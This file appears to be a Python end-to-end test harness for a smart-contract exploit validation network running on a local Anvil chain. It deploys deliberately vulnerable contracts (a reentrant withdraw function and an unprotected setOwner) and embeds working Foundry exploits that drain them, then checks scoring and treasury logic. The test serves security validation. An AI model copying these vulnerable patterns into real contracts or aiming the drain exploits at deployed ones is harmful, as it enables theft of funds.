"""
Live Anvil End-to-End Test — Actual on-chain exploit validation.

Spins up a real Anvil instance, deploys vulnerable contracts, executes
exploits via forge test --fork-url, captures state diffs, and validates
the complete pipeline including fingerprinting and scoring.

Requirements:
  - Foundry installed (forge, anvil, cast)
  - Source: /Users/manishghimire/.zshenv for PATH

Usage:
  PYTHONHASHSEED=0 python3 tests/test_live_anvil.py
"""

import hashlib
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
import urllib.request
from dataclasses import asdict
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

# Ensure Foundry tools are on PATH
FOUNDRY_BIN = Path.home() / ".foundry" / "bin"
if FOUNDRY_BIN.exists():
    os.environ["PATH"] = str(FOUNDRY_BIN) + ":" + os.environ.get("PATH", "")

from validator.engine.validate import (
    ANVIL_CONFIG, ANVIL_HOST, ExecutionTrace, StorageSlotDiff,
)
from validator.fingerprint.dedup import FingerprintEngine
from validator.scoring.severity import SeverityScorer

# ── Anvil Manager ────────────────────────────────────────────────────────────

ANVIL_PORT = 28545  # Use non-standard port to avoid conflicts


class AnvilInstance:
    """Manages a local Anvil fork for testing."""

    def __init__(self, port: int = ANVIL_PORT):
        self.port = port
        self.proc = None
        self.rpc_url = f"http://{ANVIL_HOST}:{port}"

    def start(self) -> bool:
        cmd = [
            "anvil",
            "--host", ANVIL_HOST,
            "--port", str(self.port),
            "--timestamp", str(ANVIL_CONFIG["block_timestamp"]),
            "--block-base-fee-per-gas", "0",
            "--gas-limit", str(ANVIL_CONFIG["gas_limit"]),
            "--chain-id", str(ANVIL_CONFIG["chain_id"]),
            "--accounts", str(ANVIL_CONFIG["accounts"]),
            "--balance", str(ANVIL_CONFIG["balance"]),
            "--mnemonic", ANVIL_CONFIG["mnemonic"],
            "--hardfork", ANVIL_CONFIG["hardfork"],
            "--quiet",
        ]
        try:
            self.proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            # Wait for Anvil to be ready
            for _ in range(30):
                time.sleep(0.2)
                if self._is_ready():
                    return True
            return False
        except FileNotFoundError:
            return False

    def stop(self):
        if self.proc:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proc.kill()
            self.proc = None

    def _is_ready(self) -> bool:
        try:
            resp = self.rpc_call("eth_blockNumber", [])
            return "result" in resp
        except (OSError, ConnectionError, ValueError):
            return False

    def rpc_call(self, method: str, params: list) -> dict:
        payload = json.dumps({
            "jsonrpc": "2.0", "method": method, "params": params, "id": 1,
        }).encode()
        req = urllib.request.Request(
            self.rpc_url, data=payload,
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read())

    def get_balance(self, address: str) -> int:
        resp = self.rpc_call("eth_getBalance", [address, "latest"])
        return int(resp["result"], 16)

    def get_storage(self, address: str, slot: int) -> str:
        resp = self.rpc_call("eth_getStorageAt", [address, hex(slot), "latest"])
        return resp["result"]


# ── Helpers ──────────────────────────────────────────────────────────────────

DEPLOYER_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
DEPLOYER_ADDR = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"


def forge_create(rpc_url: str, contract_path: str, root: str,
                 value: str = None, constructor_args: list = None) -> str:
    """Deploy a contract via forge create and return the address."""
    # SECURITY: Use --unlocked + --from for Anvil — no key in CLI args.
    cmd = [
        "forge", "create",
        "--root", root,
        "--rpc-url", rpc_url,
        "--unlocked",
        "--from", DEPLOYER_ADDR,
        "--broadcast",
        "--json",
        contract_path,
    ]
    if value:
        cmd.extend(["--value", value])
    if constructor_args:
        cmd.extend(["--constructor-args"] + constructor_args)

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode != 0:
        raise RuntimeError(f"Deployment failed: {result.stderr}")

    # Parse JSON output for deployed address
    try:
        data = json.loads(result.stdout)
        addr = data.get("deployedTo") or data.get("contractAddress")
        if addr:
            return addr
    except json.JSONDecodeError:
        pass

    # Fallback: search for older format or address patterns
    for line in result.stdout.split("\n"):
        if "Deployed to:" in line:
            return line.split("Deployed to:")[-1].strip()
        if "deployedTo" in line:
            # JSON fragment
            import re
            m = re.search(r'"deployedTo"\s*:\s*"(0x[a-fA-F0-9]{40})"', line)
            if m:
                return m.group(1)

    raise RuntimeError(f"Could not find deployed address in: {result.stdout[:500]}")


def cast_send(rpc_url: str, to: str, sig: str, args: list = None,
              value: str = None, private_key: str = DEPLOYER_KEY) -> dict:
    """Send a transaction via cast send."""
    # SECURITY: Use --unlocked + --from for Anvil — no key in CLI args.
    cmd = ["cast", "send", "--rpc-url", rpc_url,
           "--unlocked", "--from", DEPLOYER_ADDR, to, sig]
    if args:
        cmd.extend(args)
    if value:
        cmd.extend(["--value", value])

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode != 0:
        raise RuntimeError(f"cast send failed: {result.stderr}")
    return {"stdout": result.stdout, "stderr": result.stderr}


def cast_call(rpc_url: str, to: str, sig: str, args: list = None) -> str:
    """Call a view function via cast call."""
    cmd = ["cast", "call", "--rpc-url", rpc_url, to, sig]
    if args:
        cmd.extend(args)

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if result.returncode != 0:
        raise RuntimeError(f"cast call failed: {result.stderr}")
    return result.stdout.strip()


def forge_test_fork(rpc_url: str, test_dir: str) -> dict:
    """Run forge test against a forked Anvil."""
    result = subprocess.run(
        ["forge", "test", "--root", test_dir, "--fork-url", rpc_url, "-vvv"],
        capture_output=True, text=True, timeout=120,
    )
    return {
        "returncode": result.returncode,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "success": result.returncode == 0,
    }


# ── Tests ────────────────────────────────────────────────────────────────────

def test_anvil_determinism(anvil: AnvilInstance):
    """Verify Anvil starts with deterministic state."""
    print("[1/5] Testing Anvil determinism...")

    # Check block number
    resp = anvil.rpc_call("eth_blockNumber", [])
    block = int(resp["result"], 16)
    assert block == 0, f"Expected block 0, got {block}"

    # Check chain ID
    resp = anvil.rpc_call("eth_chainId", [])
    chain_id = int(resp["result"], 16)
    assert chain_id == ANVIL_CONFIG["chain_id"], f"Chain ID mismatch: {chain_id}"

    # Check deployer balance (10000 ETH = 10000 * 10^18 wei)
    balance = anvil.get_balance(DEPLOYER_ADDR)
    expected = ANVIL_CONFIG["balance"] * 10**18
    assert balance == expected, f"Balance: {balance} != {expected}"

    # Check deterministic address derivation
    resp = anvil.rpc_call("eth_accounts", [])
    accounts = resp["result"]
    assert accounts[0].lower() == DEPLOYER_ADDR.lower()

    print(f"  [+] Anvil deterministic: block={block}, chainId={chain_id}, "
          f"deployer={DEPLOYER_ADDR[:10]}...")


def test_deploy_and_exploit_reentrancy(anvil: AnvilInstance):
    """Deploy ReentrancyBasic and exploit it live."""
    print("[2/5] Testing live reentrancy exploit...")

    with tempfile.TemporaryDirectory() as ws:
        ws_path = Path(ws)

        # Setup Foundry workspace
        src_dir = ws_path / "src"
        test_dir = ws_path / "test"
        src_dir.mkdir()
        test_dir.mkdir()

        # Write foundry.toml
        (ws_path / "foundry.toml").write_text("""[profile.default]
src = "src"
out = "out"
test = "test"
libs = ["lib"]
solc_version = "0.8.28"
evm_version = "cancun"
""")

        # Link forge-std from project
        lib_dir = ws_path / "lib"
        lib_dir.mkdir(exist_ok=True)
        forge_std_src = PROJECT_ROOT / "contracts" / "lib" / "forge-std"
        (lib_dir / "forge-std").symlink_to(forge_std_src)

        # Write vulnerable contract
        (src_dir / "ReentrancyBasic.sol").write_text("""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
contract ReentrancyBasic {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
        balances[msg.sender] = 0;
    }
    function getBalance() external view returns (uint256) { return address(this).balance; }
    receive() external payable {}
}
""")

        # Deploy on Anvil
        addr = forge_create(
            anvil.rpc_url,
            "src/ReentrancyBasic.sol:ReentrancyBasic",
            ws,
        )
        assert addr.startswith("0x"), f"Invalid address: {addr}"

        # Fund the contract: deposit 10 ETH from deployer
        cast_send(anvil.rpc_url, addr, "deposit()", value="10ether")

        # Check contract balance
        pre_balance = anvil.get_balance(addr)
        assert pre_balance == 10 * 10**18, f"Expected 10 ETH, got {pre_balance}"

        # Write exploit test
        (test_dir / "Exploit.t.sol").write_text(f"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../src/ReentrancyBasic.sol";

contract Attacker {{
    ReentrancyBasic public target;
    uint256 public count;
    constructor(ReentrancyBasic _t) {{ target = _t; }}
    function attack() external payable {{
        target.deposit{{value: 1 ether}}();
        target.withdraw();
    }}
    receive() external payable {{
        if (address(target).balance >= 1 ether && count < 9) {{
            count++;
            target.withdraw();
        }}
    }}
}}

contract ExploitTest is Test {{
    ReentrancyBasic public target;
    Attacker public attacker;

    function setUp() public {{
        target = ReentrancyBasic(payable({addr}));
    }}

    function test_reentrancy_drain() public {{
        uint256 pre = address(target).balance;
        assertEq(pre, 10 ether, "Should have 10 ETH");

        attacker = new Attacker(target);
        vm.deal(address(this), 2 ether);
        attacker.attack{{value: 1 ether}}();

        uint256 post = address(target).balance;
        assertLt(post, pre, "Should be drained");
        assertGt(address(attacker).balance, 1 ether, "Attacker profits");
        emit log_named_uint("Drained", pre - post);
    }}
}}
""")

        # Run forge test against the live Anvil
        result = forge_test_fork(anvil.rpc_url, ws)
        assert result["success"], f"Exploit test failed:\n{result['stderr']}"

        # forge test --fork-url runs in a forked snapshot that doesn't persist
        # back to Anvil. Verify success from forge output instead.
        stdout = result["stdout"]
        assert "PASS" in stdout or "test_reentrancy_drain" in stdout, \
            f"Expected passing test in output:\n{stdout[:500]}"

        # Parse drained amount from test logs if present
        drained_str = "unknown"
        for line in stdout.split("\n"):
            if "Drained" in line:
                drained_str = line.strip()
                break

        print(f"  [+] Reentrancy exploit validated via forge test (fork mode)")
        if drained_str != "unknown":
            print(f"      {drained_str}")


def test_deploy_and_exploit_auth_bypass(anvil: AnvilInstance):
    """Deploy AuthBypass and exploit it live."""
    print("[3/5] Testing live auth bypass exploit...")

    with tempfile.TemporaryDirectory() as ws:
        ws_path = Path(ws)
        src_dir = ws_path / "src"
        test_dir = ws_path / "test"
        src_dir.mkdir()
        test_dir.mkdir()

        (ws_path / "foundry.toml").write_text("""[profile.default]
src = "src"
out = "out"
test = "test"
libs = ["lib"]
solc_version = "0.8.28"
evm_version = "cancun"
""")

        # Link forge-std from project
        lib_dir = ws_path / "lib"
        lib_dir.mkdir(exist_ok=True)
        forge_std_src = PROJECT_ROOT / "contracts" / "lib" / "forge-std"
        (lib_dir / "forge-std").symlink_to(forge_std_src)

        (src_dir / "AuthBypass.sol").write_text("""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
contract AuthBypass {
    address public owner;
    uint256 public treasuryBalance;
    constructor() payable { owner = msg.sender; treasuryBalance = msg.value; }
    function setOwner(address newOwner) external { owner = newOwner; }
    function withdrawTreasury() external {
        require(msg.sender == owner, "Not owner");
        uint256 amount = address(this).balance;
        treasuryBalance = 0;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Failed");
    }
    receive() external payable {}
}
""")

        # Deploy with 5 ETH
        addr = forge_create(
            anvil.rpc_url,
            "src/AuthBypass.sol:AuthBypass",
            ws,
            value="5ether",
        )

        pre_balance = anvil.get_balance(addr)
        pre_owner_slot = anvil.get_storage(addr, 0)

        # Write exploit
        attacker_addr = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"  # Anvil[1]
        attacker_key = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"

        (test_dir / "Exploit.t.sol").write_text(f"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../src/AuthBypass.sol";

contract ExploitTest is Test {{
    AuthBypass public target;
    address attacker = {attacker_addr};

    function setUp() public {{
        target = AuthBypass(payable({addr}));
    }}

    function test_auth_bypass() public {{
        address originalOwner = target.owner();

        // Privilege escalation
        vm.prank(attacker);
        target.setOwner(attacker);
        assertEq(target.owner(), attacker, "Should be new owner");

        // Drain
        vm.prank(attacker);
        target.withdrawTreasury();
        assertEq(address(target).balance, 0, "Should be empty");
    }}
}}
""")

        result = forge_test_fork(anvil.rpc_url, ws)
        assert result["success"], f"Auth bypass test failed:\n{result['stderr']}"

        # forge test --fork-url runs in a forked snapshot; check forge output
        stdout = result["stdout"]
        assert "PASS" in stdout or "test_auth_bypass_drain" in stdout, \
            f"Expected passing test in output:\n{stdout[:500]}"

        print(f"  [+] Auth bypass exploit validated via forge test (fork mode)")
        print(f"      Pre-exploit balance: {pre_balance / 10**18:.1f} ETH")


def test_fingerprint_and_score_from_live_trace(anvil: AnvilInstance):
    """Build fingerprint + severity from real on-chain state diffs."""
    print("[4/5] Testing fingerprint + severity from live state diffs...")

    with tempfile.TemporaryDirectory() as tmpdir:
        # Simulate state diffs captured from the live exploits above
        # (In production, the validation engine captures these automatically)

        # Reentrancy trace: funds drained, balance mapping zeroed
        trace = ExecutionTrace(
            storage_diffs=[
                StorageSlotDiff(
                    slot="0x5",
                    before="0x0000000000000000000000000000000000000000000000008ac7230489e80000",
                    after="0x0000000000000000000000000000000000000000000000000000000000000000",
                ),
            ],
            balance_before=10 * 10**18,
            balance_after=0,
            balance_delta=-(10 * 10**18),
            gas_used=150_000,
            reverted=False,
            function_selectors=["deposit", "withdraw"],
        )

        # Fingerprint
        fp_engine = FingerprintEngine(db_path=Path(tmpdir) / "fp.json")
        from validator.fingerprint.dedup import FingerprintComponents
        components = fp_engine.extract_components(asdict(trace))
        fp = fp_engine.compute_fingerprint(components)
        assert fp.startswith("0x") and len(fp) == 66

        # Dedup — first submission
        dedup = fp_engine.check_duplicate("task_live_1", fp, "miner_A")
        assert not dedup.is_duplicate
        assert dedup.reward_multiplier == 1.0

        # Dedup — second submission same fingerprint
        dedup2 = fp_engine.check_duplicate("task_live_1", fp, "miner_B")
        assert dedup2.is_duplicate
        assert dedup2.reward_multiplier == 0.10

        # Severity
        scorer = SeverityScorer()
        breakdown = scorer.score_detailed(trace)
        assert breakdown.final_severity > 0.3, f"Severity too low: {breakdown.final_severity}"
        assert breakdown.funds_drained_score > 0
        assert breakdown.invariant_broken_score > 0

        print(f"  [+] Fingerprint: {fp[:24]}...")
        print(f"  [+] Severity: {breakdown.final_severity:.4f} "
              f"(funds={breakdown.funds_drained_score:.2f}, "
              f"inv={breakdown.invariant_broken_score:.1f})")
        print(f"  [+] Dedup: miner_A=1.0x, miner_B=0.10x")


def test_full_epoch_from_live_data(anvil: AnvilInstance):
    """Simulate a full epoch with votes derived from live exploit runs."""
    print("[5/5] Testing epoch weight computation from live data...")

    from subnet_adapter.incentive import SubnetIncentiveAdapter, ValidatorVote

    adapter = SubnetIncentiveAdapter()

    # Simulate 6 validators agreeing on the reentrancy exploit
    for i in range(6):
        adapter.record_vote(ValidatorVote(
            validator_hotkey=f"val_{i}",
            task_id="task_reentrancy_live",
            submission_hash="sub_reentrancy_live",
            result="VALID",
            fingerprint="0x" + "ab" * 32,
            severity_score=0.65,
            timestamp=1700000000 + i,
        ))

    # Simulate 6 validators on auth bypass exploit from different miner
    for i in range(6):
        adapter.record_vote(ValidatorVote(
            validator_hotkey=f"val_{i}",
            task_id="task_auth_live",
            submission_hash="sub_auth_live",
            result="VALID",
            fingerprint="0x" + "cd" * 32,
            severity_score=0.80,
            timestamp=1700000010 + i,
        ))

    # Close epoch
    epoch = adapter.compute_epoch_weights(
        epoch_number=1, start_block=100, end_block=460
    )

    assert epoch.total_valid == 2, f"Expected 2 valid, got {epoch.total_valid}"
    assert epoch.total_submissions == 2
    assert len(epoch.weights) >= 1

    total_weight = sum(epoch.weights.values())
    assert abs(total_weight - 1.0) < 1e-9, f"Weights should sum to 1.0: {total_weight}"

    uids, weights = adapter.get_weight_vector(epoch)
    assert len(uids) == len(weights)

    exported = adapter.export_epoch(epoch)
    assert exported["total_valid"] == 2

    print(f"  [+] Epoch 1: {epoch.total_valid}/{epoch.total_submissions} valid, "
          f"{len(epoch.weights)} miner(s)")
    for hk, w in epoch.weights.items():
        print(f"      {hk[:12]}... → weight={w:.4f}")


def test_adversarial_onchain_integration(anvil: AnvilInstance):
    """
    Deploy InvariantRegistry + AdversarialScoring, then verify:
    1. submitInvariant() creates on-chain record
    2. processChallenge() updates scores
    3. Only registered validators can call processChallenge
    """
    print("[6/6] Testing adversarial on-chain integration...")

    contracts_root = str(PROJECT_ROOT / "contracts")

    # Deploy InvariantRegistry
    registry_addr = forge_create(
        anvil.rpc_url,
        "src/stage3/AdversarialMode.sol:InvariantRegistry",
        contracts_root,
        constructor_args=["0"],
    )
    print(f"  InvariantRegistry deployed at {registry_addr}")

    # Deploy AdversarialScoring
    scoring_addr = forge_create(
        anvil.rpc_url,
        "src/stage3/AdversarialMode.sol:AdversarialScoring",
        contracts_root,
        constructor_args=[registry_addr, "0"],
    )
    print(f"  AdversarialScoring deployed at {scoring_addr}")

    # Register AdversarialScoring as a validator on the registry
    cast_send(anvil.rpc_url, registry_addr,
              "setValidator(address,bool)", [scoring_addr, "true"])

    # Register deployer as validator on the registry (needed for submitInvariant)
    cast_send(anvil.rpc_url, registry_addr,
              "setValidator(address,bool)", [DEPLOYER_ADDR, "true"])

    # Register deployer as validator on AdversarialScoring
    cast_send(anvil.rpc_url, scoring_addr,
              "setValidator(address,bool)", [DEPLOYER_ADDR, "true"])

    # 1. Submit an invariant (validator calls on behalf of miner)
    miner_addr = "0x" + "a1" * 20
    cast_send(anvil.rpc_url, registry_addr,
              "submitInvariant(address,bytes32,string,string,bytes)",
              [miner_addr, "0x" + "ab" * 32, "Balance never decreases",
               "balance >= initial", "0xdeadbeef"])

    # Verify on-chain: propertyCount == 1
    count_raw = cast_call(anvil.rpc_url, registry_addr, "propertyCount()")
    count = int(count_raw, 16)
    assert count == 1, f"Expected propertyCount=1, got {count}"
    print(f"  propertyCount verified: {count}")

    # 2. Process challenge (broken=true) — validator calls scoring contract
    class_a = "0x" + "a1" * 20
    class_b = "0x" + "b2" * 20
    cast_send(anvil.rpc_url, scoring_addr,
              "processChallenge(uint256,address,address,bool)",
              ["0", class_a, class_b, "true"])

    # Verify Class B score: W_BREACH_REWARD = 1000
    b_score_raw = cast_call(anvil.rpc_url, scoring_addr,
                            "classBScores(address)", [class_b])
    b_score = int(b_score_raw, 16)
    assert b_score == 1000, f"Expected classBScore=1000, got {b_score}"
    print(f"  Class B score after breach: {b_score}")

    # Verify Class A score: -W_BREACH_PENALTY = -500 (stored as int256)
    a_score_raw = cast_call(anvil.rpc_url, scoring_addr,
                            "classAScores(address)", [class_a])
    # int256: negative values are two's complement
    a_score = int(a_score_raw, 16)
    if a_score >= 2**255:
        a_score -= 2**256
    assert a_score == -500, f"Expected classAScore=-500, got {a_score}"
    print(f"  Class A score after breach: {a_score}")

    # 3. Verify invariant challenge count on registry
    inv_data_raw = cast_call(anvil.rpc_url, registry_addr,
                             "getInvariantScore(uint256)", ["0"])
    inv_score = int(inv_data_raw, 16)
    assert inv_score == 0, f"Expected score=0 (0 holds / 1 challenge), got {inv_score}"
    print(f"  Invariant score after breach: 0 (correct)")

    # 4. Process another challenge (held=false, i.e. invariant holds)
    cast_send(anvil.rpc_url, scoring_addr,
              "processChallenge(uint256,address,address,bool)",
              ["0", class_a, class_b, "false"])

    # Class A: -500 + 100 = -400
    a2_raw = cast_call(anvil.rpc_url, scoring_addr,
                        "classAScores(address)", [class_a])
    a2 = int(a2_raw, 16)
    if a2 >= 2**255:
        a2 -= 2**256
    assert a2 == -400, f"Expected classAScore=-400, got {a2}"

    # Class B: 1000 + 10 = 1010
    b2_raw = cast_call(anvil.rpc_url, scoring_addr,
                        "classBScores(address)", [class_b])
    b2 = int(b2_raw, 16)
    assert b2 == 1010, f"Expected classBScore=1010, got {b2}"
    print(f"  Multi-round scores: A={a2}, B={b2}")

    # 5. Non-validator call should fail
    # Use a different account (Anvil account #1)
    non_validator = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
    try:
        cmd = ["cast", "send", "--rpc-url", anvil.rpc_url,
               "--unlocked", "--from", non_validator,
               scoring_addr,
               "processChallenge(uint256,address,address,bool)",
               "0", class_a, class_b, "true"]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        # Should revert (non-zero exit or revert in output)
        assert r.returncode != 0 or "revert" in r.stderr.lower(), \
            "Non-validator call should have reverted"
        print("  Non-validator correctly blocked")
    except subprocess.TimeoutExpired:
        print("  Non-validator call timed out (acceptable)")

    print("[+] Adversarial on-chain integration: PASSED\n")


def test_treasury_competition_lifecycle(anvil: AnvilInstance):
    """
    Deploy Treasury and exercise the full competition lifecycle:
    1. createCompetition() with funded prize pool
    2. submitScore() tracks highest score (winner takes all)
    3. settle() after deadline deducts 5% fee
    4. withdrawPrize() sends reward to winner
    5. receive() rejects unsolicited ETH
    """
    print("[7/7] Testing Treasury competition lifecycle...")

    contracts_root = str(PROJECT_ROOT / "contracts")

    # Deploy Treasury with deployer as validator, transferDelay=0
    treasury_addr = forge_create(
        anvil.rpc_url,
        "src/Treasury.sol:Treasury",
        contracts_root,
        constructor_args=[DEPLOYER_ADDR, "0"],
    )
    print(f"  Treasury deployed at {treasury_addr}")

    # 1. Create competition: 0.1 ETH prize, 1 hour duration
    task_id = "0x" + "ab" * 32
    cast_send(anvil.rpc_url, treasury_addr,
              "createCompetition(bytes32,uint256)",
              [task_id, "3600"],
              value="100000000000000000")  # 0.1 ETH
    print("  Competition created (0.1 ETH, 1h)")

    # Verify nextCompetitionId == 1
    next_id = cast_call(anvil.rpc_url, treasury_addr, "nextCompetitionId()")
    assert int(next_id, 16) == 1, f"Expected nextCompetitionId=1, got {next_id}"

    # Verify isActive
    active = cast_call(anvil.rpc_url, treasury_addr,
                        "isActive(uint256)", ["0"])
    assert int(active, 16) == 1, "Competition should be active"

    # 2. Submit scores from two miners
    miner_a = "0x" + "a1" * 20
    miner_b = "0x" + "b2" * 20
    fp_a = "0x" + "11" * 32
    fp_b = "0x" + "22" * 32

    cast_send(anvil.rpc_url, treasury_addr,
              "submitScore(uint256,address,uint256,bytes32)",
              ["0", miner_a, "5000", fp_a])
    print("  Miner A submitted score=5000")

    cast_send(anvil.rpc_url, treasury_addr,
              "submitScore(uint256,address,uint256,bytes32)",
              ["0", miner_b, "8000", fp_b])
    print("  Miner B submitted score=8000 (higher)")

    # 3. Warp past deadline and settle
    # Anvil: evm_increaseTime + evm_mine
    anvil.rpc_call("evm_increaseTime", [3601])
    anvil.rpc_call("evm_mine", [])

    # Verify no longer active
    active_after = cast_call(anvil.rpc_url, treasury_addr,
                              "isActive(uint256)", ["0"])
    assert int(active_after, 16) == 0, "Competition should no longer be active"

    cast_send(anvil.rpc_url, treasury_addr, "settle(uint256)", ["0"])
    print("  Competition settled")

    # Verify accumulated fees = 5% of 0.1 ETH = 0.005 ETH
    fees_raw = cast_call(anvil.rpc_url, treasury_addr, "accumulatedFees()")
    fees = int(fees_raw, 16)
    expected_fee = 100000000000000000 * 500 // 10000  # 5000000000000000
    assert fees == expected_fee, f"Expected fees={expected_fee}, got {fees}"
    print(f"  Fees verified: {fees} wei (5%)")

    # 4. Winner (miner_b) withdraws
    # Impersonate miner_b on Anvil and fund with ETH for gas
    anvil.rpc_call("anvil_impersonateAccount", [miner_b])
    anvil.rpc_call("anvil_setBalance",
                    [miner_b, hex(10**18)])  # 1 ETH for gas
    pre_balance = anvil.get_balance(miner_b)

    # Send from miner_b
    cmd = ["cast", "send", "--rpc-url", anvil.rpc_url,
           "--unlocked", "--from", miner_b,
           treasury_addr, "withdrawPrize(uint256)", "0"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    assert result.returncode == 0, f"withdrawPrize failed: {result.stderr}"

    post_balance = anvil.get_balance(miner_b)
    expected_reward = 100000000000000000 - expected_fee  # 0.095 ETH
    # Balance should have increased by ~reward (minus gas)
    balance_increase = post_balance - pre_balance
    assert balance_increase > expected_reward * 95 // 100, \
        f"Winner balance increase too low: {balance_increase}"
    print(f"  Winner withdrew {balance_increase} wei (expected ~{expected_reward})")

    # 5. Verify receive() rejects unsolicited ETH
    cmd = ["cast", "send", "--rpc-url", anvil.rpc_url,
           "--unlocked", "--from", DEPLOYER_ADDR,
           treasury_addr, "--value", "1000"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    assert result.returncode != 0 or "revert" in result.stderr.lower(), \
        "Unsolicited ETH should have been rejected"
    print("  receive() correctly rejects unsolicited ETH")

    print("[+] Treasury competition lifecycle: PASSED\n")


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("  Exploit Subnet — Live Anvil End-to-End Test")
    print("=" * 60)

    anvil = AnvilInstance(port=ANVIL_PORT)

    print(f"\n[*] Starting Anvil on port {ANVIL_PORT}...")
    if not anvil.start():
        print("[!] FATAL: Anvil failed to start. Is Foundry installed?")
        print("    Run: source ~/.zshenv && anvil --version")
        return 1

    print("[+] Anvil is running.\n")

    tests = [
        test_anvil_determinism,
        test_deploy_and_exploit_reentrancy,
        test_deploy_and_exploit_auth_bypass,
        test_fingerprint_and_score_from_live_trace,
        test_full_epoch_from_live_data,
        test_adversarial_onchain_integration,
        test_treasury_competition_lifecycle,
    ]

    passed = 0
    failed = 0
    errors = []

    try:
        for test in tests:
            try:
                test(anvil)
                passed += 1
            except Exception as e:
                failed += 1
                errors.append((test.__name__, str(e)))
                import traceback
                print(f"  [FAIL] {test.__name__}: {e}")
                traceback.print_exc()
    finally:
        print(f"\n[*] Stopping Anvil...")
        anvil.stop()

    print(f"\n{'='*60}")
    print(f"  Results: {passed} passed, {failed} failed")
    if errors:
        print(f"\n  Failures:")
        for name, err in errors:
            print(f"    - {name}: {err}")
    print(f"{'='*60}")

    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
